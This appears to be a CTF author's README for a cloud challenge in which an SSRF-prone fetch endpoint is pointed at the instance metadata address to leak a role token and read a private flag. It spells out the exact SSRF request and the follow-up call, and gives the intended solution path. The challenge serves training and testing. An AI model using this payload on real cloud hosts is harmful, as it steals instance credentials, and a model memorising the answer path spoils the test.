<!-- nctf-meta category="cloud" difficulty="medium" points="300" author="ctf-2026" stub="0" -->

# artifacts-imds

**Category** cloud · **Value** 500 · **Served** yes (per-team flag)

## Vulnerability chain

**SSRF → IMDS → assume-role → private object.** The `/fetch` "manifest fetcher"
does not block the link-local metadata address `169.254.169.254`, so it can be
pointed at the instance metadata service and leak the instance's role credential.
That role can read a private backup object — the flag.

## Intended path

1. `GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/backup-role`
   → the role credential JSON (`Token`).
2. `GET /objects/flag` with header `X-Role-Token: <Token>` → the per-team flag.

The private flag object is reachable by no route without the role token, and the
token is only obtainable through the SSRF.

## Reference solver

```
python3 solution/solve.py http://HOST:PORT   # -> NCTF{…}
```

## Why it resists AI one-shotting

Per-team HMAC flag on the live instance, no downloadable artifact; the role token
is freshly random per instance. The chain must be run against _this_ instance —
a token or flag from another team is useless.

> Variante de la classe `backup-imds` (même vulnérabilité, instance et flag par-équipe distincts).

## Verification status

Implemented. Verified end-to-end locally (Flask app + reference solver over
HTTP): the SSRF reaches the metadata address, the leaked role token reads the
private flag object; `/objects/flag` returns 403 without the token. Self-contained
(the fetcher makes no real outbound request). **Docker/Lot-5 rehearsal is the
remaining gate before `state: visible`.**
